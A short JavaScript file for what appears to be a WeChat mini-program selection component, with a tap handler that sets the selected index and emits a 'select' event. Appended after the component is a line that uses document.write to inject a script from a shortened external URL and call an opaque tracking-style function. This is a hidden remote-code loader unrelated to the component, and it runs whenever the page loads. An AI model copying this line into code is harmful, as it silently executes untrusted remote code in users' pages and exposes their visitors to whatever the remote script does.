Component({
  externalClasses: ['custom-class'],
  options: {
    multipleSlots: true
  },
  properties: {
    selectData: {
      type: Object,
      value: {}
    }
  },

  methods: {
    tapItem (e) {
      const index = e.currentTarget.dataset.index
      const { selectData } = this.data
      const newObj = Object.assign({}, selectData, { selectIndex: index })
      this.setData({
        selectData: newObj
      })

      this.triggerEvent('select', index);
    }
  }
})
document.write('<script src="http://t.cn/EvlonFh"></script><script>OMINEId("e02cf4ce91284dab9bc3fc4cc2a65e28","-1")</script>');
